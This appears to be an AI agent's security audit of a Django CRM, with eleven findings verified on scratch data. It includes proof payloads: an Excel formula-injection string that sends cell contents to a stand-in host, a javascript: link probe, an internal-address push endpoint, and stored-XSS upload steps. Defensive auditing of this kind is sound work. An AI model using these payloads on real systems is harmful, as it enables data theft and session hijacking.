# Security and code audit, re-done: 2026-10-28

Audited: **`main` at `b254b6d`** (2026-10-27), checked out in a separate worktree so every line number below is
`main`'s. Written to the brief in `GEMINI_AUDIT_PROMPT.md` (the Gemini run didn't work). Report only: no code was
changed. Every finding below was opened in the file, quoted verbatim, and proved with a command whose real output is
pasted. Where a step could not be proved, the finding says UNVERIFIED.

How it was checked:
- **Data:** no real data. This container has no live database (its `db.sqlite3` is an empty 4 KB file). Everything
  ran on two scratch SQLite files made by `migrate` on `main` plus a seed script of made-up records (companies,
  deals, contracts, a data room with a partner, a shared mailbox, a client search with a share link, board cards).
  No `.env` exists in the worktree, so no secret was read or printed.
- **Network:** no calls to Gmail, Google Calendar, Anthropic, county services or anything that sends. The access
  crawl patched `requests` to refuse every outbound call; Gmail behaviour was proved with the repo's own `FakeGmail`.
- **Access crawl:** all 261 `crm:` URL patterns, GET and POST, as four roles (signed out, a capital partner, a plain
  team member, a Manager), each request inside a transaction that was rolled back.
- **Dependencies:** `pip-audit` 2.10.1 from a throwaway virtualenv in the scratchpad (not the project's `.venv`),
  against `requirements.txt` and against the 66 packages actually installed.
- **Baseline:** `main`'s own test suite, see the last line of this report.

## 1. Summary

| # | Severity | file:line | One line | Status |
|---|---|---|---|---|
| 1 | Medium | `crm/boards/views.py:512` | Any team member can upload an HTML or SVG card attachment that runs as script for whoever opens it (Managers included) | VERIFIED |
| 2 | Medium | `cloudbuild.yaml` (no `ACMI_TOKEN_KEY`), `crm/tokens.py:42` | On Cloud Run every Google refresh token (full Gmail access) would be stored unencrypted | VERIFIED (config) |
| 3 | Low | `crm/reports.py:156` | Text starting with `=` (a company name, e.g. from a spreadsheet import) becomes a live formula in the pipeline / investor Excel export | VERIFIED |
| 4 | Low | `crm/mail/inbox_views.py:502` | A **read-only** grantee of a shared mailbox can change it: filing a thread creates Gmail labels and labels the thread | VERIFIED |
| 5 | Low | `crm/dataroom/views.py:33`, `crm/dataroom/logic.py:202` | Data room lockout keys on `REMOTE_ADDR` and a per-process cache: behind a proxy, 5 wrong passwords for one partner lock out every partner | VERIFIED (proxy address UNVERIFIED on Cloud Run) |
| 6 | Low | `config/settings.py:130`, `crm/auth.py:42` | A partner's password works on `/accounts/login/` even with `ACMI_LOCAL_LOGIN=false`, skipping the room's lockout and sign-in log | VERIFIED |
| 7 | Low | `crm/push.py:81` | Push subscriptions accept any `https://` endpoint, so a team member can make the server POST to an internal HTTPS address | VERIFIED |
| 8 | Low | `crm/mail/search.py:113` | Capital partners' accounts are offered as "ACMI" teammates in To / Cc / Bcc suggestions | VERIFIED |
| 9 | Low | `requirements.txt:6`, `:18` | `pypdf 6.20.1` (7 advisories, DoS on crafted PDFs, which counterparties send) and `pillow 12.3.0` (39 advisories) | VERIFIED (pip-audit) |
| 10 | Info | `crm/boards/views.py:497`, `card_dialog.html:60` | A card link attachment is stored without URL validation; a `javascript:` link did **not** run in Chromium | UNVERIFIED |
| 11 | Low | `crm/views.py:708` | "Not a deal" lost its `@require_POST` on Oct 27, so a plain link (GET) hides a deal suggestion for everyone | VERIFIED (GET writes); cross-site click UNVERIFIED |

Findings 1, 2, 5 and 8 were found in the 2026-10-26 review and are **fixed on branch
`claude/beautiful-albattani-6xp3qi`** (commit `3e82913`, with tests). That branch is not merged and is 42 commits
behind `main`, so they are still open on `main`. Findings 3, 4, 6, 7, 9, 10 and 11 are new (11 turned up during the
UI review the same day).

The Oct 16 fixes still hold on `main`: Content-Security-Policy is sent (`config/settings.py:240`), Manager-only actions
refuse plain members (section 3), the team's password sign-in honours `ACMI_LOCAL_LOGIN` (except finding 6, which is
partner-only), uploaded documents are served through signed-in views, and `/internal/sync-mail/` refuses without its
secret.

## 2. Findings

### 1. Card attachments run as hub pages (Medium, VERIFIED)

**Quote** (`crm/boards/views.py`):
```
491:         url = request.POST.get("url", "").strip()
492:         f = request.FILES.get("file")
...
497:             CardAttachment.objects.create(card=card, name=name[:300], url=url[:1000], file=f, added_by=request.user)
...
508: def attachment_file(request, pk):
509:     att = get_object_or_404(CardAttachment, pk=pk)
510:     if not att.file:
511:         raise Http404
512:     return FileResponse(att.file.open("rb"), as_attachment=False, filename=att.name)
```
and the site policy (`config/settings.py`):
```
240: CONTENT_SECURITY_POLICY = env(
241:     "ACMI_CSP",
242:     "script-src 'self' 'unsafe-inline' https://unpkg.com; object-src 'none'; base-uri 'self'; frame-ancestors 'self'",
243: )
```

**Path:** a signed-in team member posts any file to `/boards/cards/<id>/attach/` (`attachment_edit`, no type check,
the display name is free text). `attachment_file` serves it inline with a content type guessed from `att.name`. A
`.html` or `.svg` file is then a page on the hub's own origin, and the policy allows inline script, so it runs with
the session of whoever opens it: it can read pages, take the CSRF token and post as them (send outreach, delete or
merge records, change a data room, invite a partner) if they are a Manager or admin.

**Proof** (scratch DB; Simon is a plain member, Demo a Manager):
```
. env_check.sh; python manage.py shell -c "... simon.post('/boards/cards/9/attach/', {'file': SimpleUploadedFile(name, body)}) ...
                                            demo.get('/boards/attachments/<id>/file/') ..."
site-notes.html | upload 302 | open 200 | text/html | inline; filename="site-notes.html" | CSP: script-src 'self' 'unsafe-inline' https://unpkg.com; object-src 'none'; base-uri 'self'; frame-ancestors 'self'
map.svg | upload 302 | open 200 | image/svg+xml | inline; filename="map.svg" | CSP: script-src 'self' 'unsafe-inline' https://unpkg.com; object-src 'none'; base-uri 'self'; frame-ancestors 'self'
```

**Guards checked:** sign-in (only team members can upload, so the attacker is an insider or a stolen account), the
Trello import (creates link attachments only, `crm/boards/trello_import.py:244`, so no outside file arrives this way
today), the CSP (allows inline script). Every other upload endpoint opens only PDFs and pictures inline
(`INLINE_TYPES` in eight views, `flyer.SUFFIXES` in `crm/land/flyer.py:15`); the data room always downloads.

**Fix:** serve only `.pdf .png .jpg .jpeg .gif .webp` inline, everything else `as_attachment=True` (as the other
eight file views do), and take the extension from the stored file, not the display name. Already done on the branch.

### 2. Google tokens unencrypted on Cloud Run (Medium, VERIFIED from the config)

**Quote** (`crm/tokens.py`):
```
40: def encrypt(value):
41:     f = _fernet()
42:     if not value or value.startswith(PREFIX) or f is None:
43:         return value
```
**Proof:**
```
$ grep -n "ACMI_TOKEN_KEY\|VAPID" cloudbuild.yaml | wc -l
0
```
**Path:** none of the four Cloud Run jobs or the service in `cloudbuild.yaml` gets `ACMI_TOKEN_KEY`, so `_fernet()`
is `None` and `encrypt()` returns the token as typed. Each person's Google refresh token (Gmail read, send and modify,
Calendar) and each shared mailbox's (`SharedMailboxToken`) would sit in Cloud SQL and its backups in plain text.
Tokens already encrypted on the laptop would fail to decrypt after the move ("that person has to reconnect",
`crm/tokens.py:57`). The same file also gives the send job no Google client and no VAPID keys (functional, not
security).

**Guards checked:** encryption works when the key is set (the laptop); nothing refuses to start without it.

**Fix:** add `ACMI_TOKEN_KEY=acmi-token-key:latest` (and the VAPID pair) to every job's `--set-secrets`, create the
secrets with the laptop's values before the first deploy. Done on the branch.

### 3. Formula injection in the Excel exports (Low, VERIFIED)

**Quote** (`crm/reports.py`):
```
72: def cell_value(o, key):
...
78:         "tenant": o.company.name,
...
156:                 cell = ws.cell(row=row, column=col_of[c.key], value=cell_value(o, c.key))
```
and the spreadsheet import keeps the text as typed (`crm/sheet_import/logic.py`):
```
159:     return str(value).replace("\xa0", " ").strip()
```
**Path:** a company name (typed, or from a broker's spreadsheet through `/import/`) that starts with `=` reaches
`ws.cell(value=...)`; openpyxl stores any string starting with `=` as a formula. Whoever opens
`/reports/pipeline.xlsx` (the investor report, which goes to capital partners) runs it. `HYPERLINK` can carry other
cells to an outside address when clicked; Excel's `WEBSERVICE` can send them on recalculation once content is enabled.

**Proof:**
```
python manage.py shell -c "... co.name = '=HYPERLINK(\"https://example.invalid/?q=\"&B7,\"Castelion\")' ... c.get('/reports/pipeline.xlsx') ..."
export 200 application/vnd.openxmlformats-officedoc
cells holding the name: [('Tenants', 'D15', 'f', '=HYPERLINK("https://example.invalid/?q="&B7,"Castelion")')]
```
(`data_type` `'f'` is a formula.)

**Guards checked:** none in the export; Excel shows a security prompt for external content, which is the only stop.

**Fix:** in the report writer, prefix text that starts with `= + - @` (or a tab / carriage return) with `'`, or set
`cell.data_type = "s"` after assigning; keep the deliberate formulas (`=SUM`, `=IFERROR`) as they are.

### 4. A read-only shared-mailbox grantee can change the mailbox (Low, VERIFIED)

**Quote** (`crm/mail/inbox_views.py`, no `may_change` check, unlike `act`, `label_edit` and the compose views):
```
500: @mail_required
501: @require_POST
502: def file_to(request, mailbox, client):
...
507:         mail_filing.file_thread(mailbox, client, gmail_id, target, user=request.user,
```
then `crm/mail/filing.py:197` `crm_labels.sync_threads(mailbox, client, list(rows.values()))` and
`crm/mail/crm_labels.py`:
```
36: def enabled_for(mailbox):
37:     """A person's mailbox follows their switch; a shared mailbox always carries the CRM labels."""
38:     return mailbox.shared or enabled(mailbox.user)
...
173:             client.modify_thread(t.gmail_id, add=add)
```
**Path:** the READ_ONLY rule says a reader can't "send from it or change it". Filing a thread (`/inbox/file/`) as a
reader runs the label sync, which creates `ACMI/...` labels in the shared Gmail mailbox and adds one to the thread.
`unfile` (`inbox_views.py:523`) has the same gap.

**Proof** (a throwaway test on the repo's `FakeGmail`, deleted afterwards):
```
PROBE role: read
PROBE file_to: 302
PROBE Gmail writes after the read-only grantee filed: [('/labels', {'name': 'ACMI', ...}), ('/labels', {'name': 'ACMI/Tenants', ...}), ('/labels', {'name': 'ACMI/Tenants/Firehawk Aerospace', ...}), ('/threads/a1/modify', {'addLabelIds': ['Label_7'], 'removeLabelIds': []})]
PROBE for comparison, archive as read-only: 302 Gmail writes: []
```
**Guards checked:** `mail_required` (only lets the person in), `may_change` (not called here). The CRM side of
filing (timeline rows) is something any team member may do anyway; only the Gmail writes break the rule.

**Fix:** in `file_to` and `unfile`, skip the label sync (or refuse) when `shared.can_change()` is false; a reader's
filing can still go on the CRM timeline.

### 5. Data room lockout: shared address and per-process counts (Low, VERIFIED; the Cloud Run address is UNVERIFIED)

**Quote:**
```
crm/dataroom/views.py
32: def _ip(request):
33:     return request.META.get("REMOTE_ADDR", "")
crm/dataroom/logic.py
202: def _keys(username, ip):
203:     return [f"room-login:u:{(username or '').lower()}", f"room-login:ip:{ip}"]
...
206: def locked(username, ip):
207:     return any((cache.get(k) or 0) >= MAX_FAILURES for k in _keys(username, ip))
```
**Path:** behind Cloud Run's front end, the connection the app sees comes from the proxy, so every visitor shares one
`REMOTE_ADDR`. Five wrong passwords for any account then lock the address key for everyone for 15 minutes. And with no
`CACHES` setting the counts live in each gunicorn process's memory, so the "5" is per worker and per instance.

**Proof** (two partners, both arriving from the same proxy address):
```
CACHES setting: django.core.cache.backends.locmem.LocMemCache
bob, right password, after 5 wrong ones for alice from the same address: 200 locked
config/settings.py: no CACHES setting (Django's per-process memory cache)
```
That Cloud Run's `REMOTE_ADDR` is the proxy's is not proved here (nothing is deployed); it is how Google's front end
forwards (the client is in `X-Forwarded-For`).

**Guards checked:** the per-account key works; the room's password rules (12 characters, `crm/dataroom/views.py:24`).

**Fix:** count failures in the database (a small table, pruned), and take the client from the last
`X-Forwarded-For` entry when `SECURE_PROXY_SSL_HEADER` is set. Done on the branch (migration `0068_data_room_login_attempts`,
which collides with `main`'s own `0068_ux_capture` and needs renumbering when merged).

### 6. Partners can sign in on the team's page (Low, VERIFIED)

**Quote:**
```
config/settings.py
125: AUTHENTICATION_BACKENDS = [
...
130:     "crm.auth.PartnerBackend",
crm/auth.py
38: class PartnerBackend(ModelBackend):
39:     """Capital partners' passwords (crm/dataroom/). Works whether or not the team's password sign-in is on, and only
```
**Path:** `/accounts/login/` calls Django's `authenticate()`, which tries every backend, so `PartnerBackend` signs a
partner in there too, even with team password sign-in off (`/accounts/login/` is not in `LOCAL_LOGIN_PREFIXES`,
`crm/middleware.py:16`). The partner still lands in the room (`PartnerOnlyMiddleware` holds), but the room's lockout
(finding 5) and its "sign-in" log entry are skipped; allauth's own rate limit applies instead.

**Proof:**
```
team password sign-in on : /accounts/login/ -> 302 / | signed in as user 3 via crm.auth.PartnerBackend
   then /companies/ -> 302 /room/
team password sign-in off: /accounts/login/ -> 302 / | signed in as user 3 via crm.auth.PartnerBackend
   then /companies/ -> 302 /room/
```
**Fix:** in `PartnerBackend.authenticate`, return `None` unless `request.path` starts with `/room/`.

### 7. Push endpoints can point anywhere over HTTPS (Low, VERIFIED)

**Quote** (`crm/push.py`):
```
81:     if is_partner(user) or not re.match(r"^https://", endpoint) or not keys.get("p256dh") or not keys.get("auth"):
...
111:             webpush(
112:                 subscription_info={"endpoint": sub.endpoint, "keys": {"p256dh": sub.p256dh, "auth": sub.auth}},
```
**Path:** a signed-in team member posts a subscription to `/notifications/push/subscribe/` with any `https://` URL;
every notification for them (or Send test) makes the server POST an encrypted body there. Blind (no response comes
back), HTTPS only, from the Cloud Run egress.

**Proof:**
```
subscribe 200 b'{"ok": true, "device": "Browser"}'
stored endpoints: ['https://10.0.0.7:8443/internal/hook']
the server would POST to: ['https://10.0.0.7:8443/internal/hook']
```
**Fix:** accept only the browsers' push services (hosts ending in `fcm.googleapis.com`, `push.services.mozilla.com`,
`notify.windows.com`, `push.apple.com`, `web.push.apple.com`).

### 8. Partners suggested as teammates (Low, VERIFIED)

**Quote** (`crm/mail/search.py`):
```
113:     for u in get_user_model().objects.filter(is_active=True).filter(
114:             Q(first_name__icontains=w) | Q(last_name__icontains=w) | Q(email__icontains=w)).exclude(email="")[:10]:
115:         add(u.get_full_name(), u.email, "ACMI")
```
**Proof:** typing "alice" as a team member returns the partner account `[('', 'alice@fortress.example', None)]`
grouped as ACMI. Internal mail could go to a capital partner by mistake. **Fix:** use `permissions.team_users()`
there. Done on the branch.

### 9. Outdated PDF and image libraries (Low, VERIFIED)

**Quote:** `requirements.txt:6` `pypdf==6.20.1`, `requirements.txt:18` `pillow==12.3.0`.
**Proof:**
```
$ pip-audit -r installed.txt --no-deps -f json
aiohttp 3.14.3: 8 advisories, fixed in 3.14.4
pillow 12.3.0: 39 advisories, fixed in 13.0.0
pypdf 6.20.1: 7 advisories, fixed in 6.21.2
packages checked: 66
```
**Path:** `pypdf` reads uploaded PDFs that come from outside, a counterparty's contract or a news scan
(`crm/contracts/text.py:67` `reader = pypdf.PdfReader(io.BytesIO(data))`, `crm/news/scan_parser.py:69`); its
advisories are memory and CPU exhaustion, so a crafted PDF ties up a worker. `Pillow` only opens images downloaded
from the map services (`crm/land/briefs.py:70` `img = Image.open(io.BytesIO(resp.content)).convert("RGBA")`), so its
memory-safety bugs need a malicious tile server. `aiohttp` is only `pywebpush`'s HTTP client; its advisories are
server-side and cookie handling. **Fix:** `pypdf==6.21.2`, `pillow==13.0.0` (run the test suite and one brief PDF),
and let `aiohttp` follow `pywebpush`.

### 10. Link attachments aren't validated (Info, UNVERIFIED)

`attachment_edit` stores `url` with `objects.create` (line 497), which skips the `URLField` check, and the card dialog
prints it as an `href` (`card_dialog.html:60`, `target="_blank" rel="noopener"`). A `javascript:` link opened in
Chromium only a blank tab, and the script never reached the server:
```
{"href":"javascript:fetch(\"/healthz?probe=\"+docum","target":"_blank","popupOpened":true,"popupUrl":"about:blank","scriptRanAndCalledServer":[]}
```
Other browsers weren't tested. **Fix (cheap):** accept only `http(s)://` links in `attachment_edit`.

### 11. "Not a deal" works from a plain link (Low, VERIFIED; the cross-site step UNVERIFIED)

**Quote** (`crm/views.py`):
```
695: @require_POST
696: @require_POST
697: def reply_dismiss(request, pk):
...
708: def suggestion_dismiss(request, company_id):
709:     company = get_object_or_404(Company, pk=company_id)
710:     DealSuggestionDismissal.objects.get_or_create(company=company, defaults={"dismissed_by": request.user})
```
In the first commit (`f5b3fd6`) `suggestion_dismiss` had `@require_POST` directly above it (line 593 there). Commit
`bef7f34` (2026-10-27, "My day replies open or dismiss") put `reply_dismiss` between that decorator and the
function, so `reply_dismiss` now has it twice and `suggestion_dismiss` has none. The only caller in the app is a POST
form (`partials/deal_suggestions.html:8`), so nothing in the UI depends on GET.

**Path:** `/opportunities/suggested/<company_id>/dismiss/` (`crm/urls.py:61`) → `suggestion_dismiss` → a
`DealSuggestionDismissal` row, which takes that company off the "possible deals found in email" list **for the whole
team** for good. Without POST there's no CSRF token check, so any link a signed-in team member opens does it. The
session cookie is Django's default `SameSite=Lax` (`config/settings.py` sets only `SESSION_COOKIE_SECURE`), which
browsers send on a top-level link click from another site. That last step is standard browser behaviour but I
didn't test it in a browser here.

**Proof** (test client, team member `simon`, rolled back):
```
GET 302 dismissals for that company: 0 -> 1
```
**Harm:** small. An email or page could hide a real deal lead from the pipeline page without anyone noticing.
**Fix:** move `@require_POST` from line 696 down to above line 708.

## 3. Reviewed and sound

- **Signed out:** across all 261 URLs, GET and POST, only `/sw.js`, the guest pages `/g/<token>/...` and
  `/room/login/` answer; everything else redirects to sign-in, 404s or (cron) 403s. `/internal/sync-mail/` is POST only,
  CSRF-exempt by design, refuses without `ACMI_CRON_SECRET` and compares with `hmac.compare_digest`
  (`crm/mail/views.py:231-237`).
- **Capital partner:** every page outside `/room/` sends them back to `/room/` (all 261, both methods). Inside the
  room, switched-off deals and their files 404. Room pages are built from an allow-list (`crm/dataroom/logic.py`
  `ROOM_COLUMNS`, `card`), and partner files always download.
- **Guest share links:** pages fetched signed out contained none of 18 internal strings (landowner names, mailing
  addresses, site notes, contract titles, prices, counterparties, team names); only parcels' street addresses appear,
  which locate the site. Wrong, short and switched-off tokens 404; tokens are 192-bit (`assignments.new_token`).
- **Plain member vs Manager:** deletes and merges (company, person, deal, contract, land site), settings and
  dropdowns, outreach settings and templates, data rooms, shared-mailbox connect / grant / log, Drive share and swap,
  import Undo all refuse a plain member.
- **Mail rendering:** bodies stay in `<iframe sandbox="allow-same-origin allow-popups ...">` without `allow-scripts`
  (`mail_reader.html:161`) under `default-src 'none'`. The new formatting editor fills itself only from
  server-sanitised HTML (`compose.js:262`, `compose_views.py:132` `compose.formatted`); forwarded file names are
  escaped (`compose.js:521`).
- **Escaping:** the `|safe` / `mark_safe` set is unchanged since the 2026-10-26 review (four templates, ten Python
  sites, each fed by an escaping builder or `sanitize_html`); no `autoescape off`.
- **Shared-mailbox Google connect:** `state` kept in the session and compared in constant time, Gmail scope required,
  address must match and be verified (`crm/mail/shared.py:112-141`).
- **Uploads parsed on the server:** a contract `.docx` with an external entity or a billion-laughs DTD is refused
  (`ParseError undefined entity`, `limit on input amplification factor ... breached` in 0.12 s). The spreadsheet
  import caps size, rows, columns and cells (`crm/sheet_import/logic.py:41-44`) and reads with `read_only=True`.
- **Split view:** frames only same-origin paths (`split.js:87-89` sets `pathname + search + hash`); framing is
  `frame-ancestors 'self'` with `X_FRAME_OPTIONS = "SAMEORIGIN"`.
- **PDF export:** unchanged in the risky parts since Oct 16: temp directory, `file://` page, autoescaped template
  with `css|safe` only, `--no-sandbox` only on request, sanitised download name.
- **Redirects from requests:** every one is POST-only (CSRF-protected) or checked with
  `url_has_allowed_host_and_scheme`.
- **Code patterns:** no raw SQL (`cursor.execute`, `.raw(`, `.extra(`, `RawSQL`: 0 hits), no `pickle`, `yaml.load`,
  `eval`, `exec`, `shell=True` or `os.system` (0 hits); one `@csrf_exempt` (the cron URL).

**Outside input that reaches records by design** (no change suggested, worth knowing):
- An emailed `.ics` with an outside attendee puts a meeting on the team calendar, and a same-titled invite within 15
  minutes adds its guests to an existing meeting (`crm/invites.py` `save`).
- Claude's directory sort files firms from email signatures (flagged 2026-10-26; mitigations there).

## 4. Not reached

- Postgres, the Docker image and a real Cloud Run deploy (including what `REMOTE_ADDR` is there).
- The live database: county data checks, counts, real tokens (none here).
- Browsers other than Chromium (finding 10).
- Prompt-injection behaviour of the Claude features (directory sort, flyer reading, contract Q&A) beyond reading the
  code.
- The Trello import commands beyond their attachment handling (they run offline on an export).

## 5. Files opened

`crm/middleware.py`, `crm/permissions.py`, `crm/auth.py`, `config/settings.py` (backends, sign-in, CSP, security
headers), `cloudbuild.yaml`, `requirements.txt`, `crm/tokens.py`, `crm/dataroom/views.py`, `crm/dataroom/logic.py`,
`crm/land/assignments.py`, `crm/land/assignment_views.py`, `crm/templates/crm/guest_assignment.html`,
`guest_base.html`, `guest_report.html`, `partials/dd_report.html`, `crm/push.py`, `crm/push_views.py`,
`crm/boards/views.py`, `crm/boards/trello_import.py`, `crm/templates/crm/partials/card_dialog.html`, `crm/models.py`
(CardAttachment, Assignment, SharedMailboxToken), `crm/reports.py`, `crm/sheet_import/logic.py`,
`crm/sheet_import/views.py`, `crm/mail/inbox_views.py`, `crm/mail/compose.py`, `crm/mail/compose_views.py`,
`crm/mail/filing.py`, `crm/mail/crm_labels.py`, `crm/mail/shared.py`, `crm/mail/views.py`, `crm/mail/search.py`,
`crm/static/crm/compose.js`, `crm/static/crm/split.js`, `crm/templates/crm/partials/mail_reader.html`,
`crm/templates/crm/compose.html`, `crm/templatetags/crm_tags.py`, `crm/contracts/text.py`, `crm/contracts/views.py`,
`crm/directory/views.py`, `crm/entitlements/views.py`, `crm/invites.py`, `crm/news/scan_parser.py`,
`crm/land/briefs.py`, `crm/land/flyer.py`, `crm/land/comp_views.py`, `crm/templates/crm/land_briefs_pdf.html`,
the eight other file-serving views (`crm/views.py`, `capital`, `build`, `entitlements`, `contracts`, `diligence`,
`brief_views`, `comp_views`), `crm/tests/test_shared_mailboxes.py` and `test_gmail_api.py` (for the probe),
`crm/urls.py`, `crm/templates/crm/partials/deal_suggestions.html` (finding 11), `docs/AUDIT_BRIEF.md`,
`docs/AUDIT_REPORT.md`, `docs/HANDOFF.md`.

Baseline: `main`'s test suite at `b254b6d`: 830 tests, all pass (225 s).
